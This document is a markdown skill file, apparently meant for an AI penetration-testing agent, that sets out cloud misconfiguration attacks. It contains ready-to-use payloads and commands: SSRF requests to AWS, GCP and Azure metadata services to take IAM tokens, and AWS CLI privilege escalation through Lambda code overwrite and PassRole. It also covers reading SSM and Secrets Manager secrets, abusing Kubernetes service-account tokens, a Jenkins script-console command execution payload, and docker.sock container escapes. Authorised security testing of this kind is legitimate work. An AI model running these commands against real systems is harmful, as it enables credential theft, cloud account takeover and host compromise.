---
name: cloud-misconfig
description: Cloud misconfiguration testing — IAM privilege escalation, exposed metadata, CI/CD secrets, and container security
---

# Cloud Misconfiguration

Cloud environments present a distinct attack surface from traditional web vulnerabilities. Misconfigured IAM policies, exposed metadata services, insecure CI/CD pipelines, and container escape paths can give attackers access to an entire cloud account. This complements the s3_bucket_misconfig.md skill.

## AWS Misconfigurations

### IMDSv1 Exposure via SSRF

```bash
# If SSRF exists on EC2/ECS-hosted app:
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
# Returns: AccessKeyId, SecretAccessKey, Token (temporary)

# User data (often contains secrets):
http://169.254.169.254/latest/user-data

# ECS task credentials:
http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
```

### IAM Privilege Escalation Paths

```bash
# Check permissions:
aws iam get-user
aws iam list-attached-user-policies --user-name USERNAME
aws iam get-policy-version --policy-arn ARN --version-id v1

# Escalation via Lambda:
# If you have lambda:UpdateFunctionCode → overwrite existing Lambda function
aws lambda update-function-code --function-name TARGET_FUNCTION \
  --zip-file fileb://evil-lambda.zip

# Escalation via EC2:
# If you have ec2:RunInstances + iam:PassRole → run EC2 with privileged role
aws ec2 run-instances --image-id ami-xxx --instance-type t2.micro \
  --iam-instance-profile Name=ADMIN_ROLE --user-data file://steal-keys.sh

# Escalation via CodeBuild:
# codebuild:StartBuild + iam:PassRole → build job with elevated role

# Read secrets from SSM:
aws ssm get-parameter --name /prod/db/password --with-decryption
aws ssm get-parameters-by-path --path /prod/ --with-decryption --recursive

# Read Secrets Manager:
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id prod/api-keys
```

### Public Lambda Functions / API Gateway

```bash
# Find exposed Lambda function URLs:
curl https://XXXXXXXX.lambda-url.us-east-1.on.aws/

# API Gateway endpoints:
# Check Swagger/OpenAPI exposed at /swagger, /api-docs
# x-amazon-apigateway-auth: NONE = no auth required

# Lambda environment variables (from SSRF to metadata):
http://169.254.169.254/latest/meta-data/... 
# Then use credentials to read Lambda env vars:
aws lambda get-function-configuration --function-name FUNCTION_NAME
```

### CloudFormation / Terraform Exposure

```bash
# CloudFormation stacks may contain secrets in Parameters/Outputs:
aws cloudformation describe-stacks
aws cloudformation get-template --stack-name STACK_NAME

# Terraform state files (often in S3):
s3://target-terraform/terraform.tfstate
# Contains: resource configs, sometimes plaintext secrets, database URLs

# Check for public Terraform state:
aws s3 ls s3://target-terraform/ --no-sign-request
aws s3 cp s3://target-terraform/terraform.tfstate /tmp/ --no-sign-request
```

## GCP Misconfigurations

### Metadata Service (SSRF)

```bash
# From SSRF on GCP:
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env  # GKE
# Header required: Metadata-Flavor: Google
```

### GCP IAM Misconfiguration

```bash
# Overly permissive service account:
# roles/editor or roles/owner on default service account

# Check SA permissions:
gcloud iam service-accounts list
gcloud projects get-iam-policy PROJECT_ID

# Workload Identity misconfiguration → any pod can impersonate SA
# Check: metadata.google.internal accessible from all pods
```

## Azure Misconfigurations

### IMDS and MSI

```bash
# From SSRF on Azure:
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Header: Metadata: true

# MSI token:
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# Use token to access Azure management API:
curl -H "Authorization: Bearer TOKEN" \
  https://management.azure.com/subscriptions?api-version=2020-01-01
```

### Azure Storage SAS Token Abuse

```bash
# SAS (Shared Access Signature) tokens in URLs:
https://account.blob.core.windows.net/container/file?sv=2020-08-04&ss=b&srt=co&sp=rwdlacupitfx&se=2024-12-31...

# If SAS token leaked (in JS, logs, error messages):
# Use it to access/modify storage beyond intended scope
# Test: can SAS token access other containers? Other operations?

# Overly permissive SAS: sp=rwdlacupitfx = all permissions including write/delete
```

## Kubernetes Misconfigurations

### Service Account Token Abuse

```bash
# Default token mounted at:
/var/run/secrets/kubernetes.io/serviceaccount/token

# From SSRF or container access:
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/default/secrets

# List all pods:
curl -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/pods

# Read secrets:
curl -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets
```

### RBAC Misconfigurations

```bash
# Dangerous cluster roles:
# system:masters group members → cluster admin
# wildcard verbs: ["*"] or resources: ["*"]
# get secrets → can read all secrets in namespace

# Check your permissions:
kubectl auth can-i --list
kubectl auth can-i get secrets --namespace kube-system
kubectl auth can-i create pods
```

### Exposed Kubernetes Dashboard / API

```bash
# Exposed dashboard:
https://k8s-dashboard.target.com
http://target.com:8001  # kubectl proxy

# Exposed API server:
https://target.com:6443  # Direct API
# Test: curl https://target.com:6443/api/v1/namespaces --insecure

# Kubelet on 10255 (read-only, deprecated):
http://node-ip:10255/pods
http://node-ip:10255/runningpods

# Kubelet on 10250 (authenticated):
https://node-ip:10250/exec/namespace/pod/container
```

## CI/CD Misconfiguration

### GitHub Actions Secrets

```yaml
# Secrets in env vars:
env:
  AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
  
# Can be leaked via:
# Logging: echo "key=${{ secrets.SECRET }}"
# Artifact upload containing env vars
# Debug mode: ACTIONS_STEP_DEBUG=true logs all env vars
# If PR from fork can access secrets (misconfigured trigger)
```

### GitLab CI Exposed Variables

```bash
# Unmasked variables in job logs
# Variables accessible to fork/external pipelines
# artifact: expose secrets in downloadable artifacts

# Check: does the pipeline run for external MRs?
# Protected variables: only run on protected branches
```

### Jenkins Misconfiguration

```bash
# Script console (RCE if accessible):
https://jenkins.target.com/script
# POST: script=println "id".execute().text

# Credentials endpoint:
https://jenkins.target.com/credentials/
https://jenkins.target.com/credential-store/

# API with anon access:
https://jenkins.target.com/api/json
https://jenkins.target.com/job/JOB_NAME/api/json
```

## Container Escape Paths

```bash
# Privileged container:
docker run --privileged → mount host filesystem
# Escape: mount host disk and write to /etc/cron.d

# hostPath volume mounted:
# If /host is mounted → access host filesystem
ls /host/etc/passwd

# docker.sock mounted:
# /var/run/docker.sock → create privileged container on host
curl --unix-socket /var/run/docker.sock http://localhost/containers/json
curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/create \
  -d '{"Image":"ubuntu","Binds":["/:/host"],"Privileged":true}'

# CAP_SYS_ADMIN:
# Mount host filesystem via cgroups notification_on_release
```

## Testing Methodology

1. **SSRF → Metadata** — Always try cloud metadata endpoints when SSRF found
2. **Leaked credentials** — Check JS, config files, git history for cloud credentials
3. **IAM permission enumeration** — With any AWS key, enumerate all permissions
4. **Storage enumeration** — S3/GCS/Azure blob scanning
5. **Kubernetes** — SA token abuse, RBAC review, exposed APIs
6. **CI/CD** — Check pipeline configs for secret exposure, external PR access
7. **Container** — Check if running privileged, docker.sock mounted, hostPath

## Validation

1. For SSRF → metadata: show the IAM credentials returned
2. For IAM escalation: show the escalation path and resulting access level
3. For exposed storage: list bucket contents or download non-sensitive file
4. Use `sts:GetCallerIdentity` to confirm AWS credential scope

## Pro Tips

1. IMDSv2 requires a PUT request for token — check if SSRF can make PUT requests
2. AWS credentials from metadata are temporary (STS) — they expire in 6h
3. `pacu` is AWS exploitation framework for post-IAM-access exploitation
4. Terraform state in S3 is the most common cloud secret leakage vector
5. `enumerate-iam` automates AWS permission enumeration from compromised credentials
6. Check `iam:PassRole` — it's the most common privilege escalation primitive in AWS
7. Kubernetes default service account often has excessive permissions in managed clusters

## Summary

Cloud misconfigurations compound traditional vulnerabilities: SSRF becomes credential theft, leaked IAM keys become full account compromise, and exposed CI/CD pipelines become supply chain attacks. Test cloud metadata endpoints whenever SSRF exists, enumerate storage buckets, and review IAM policies for privilege escalation paths.
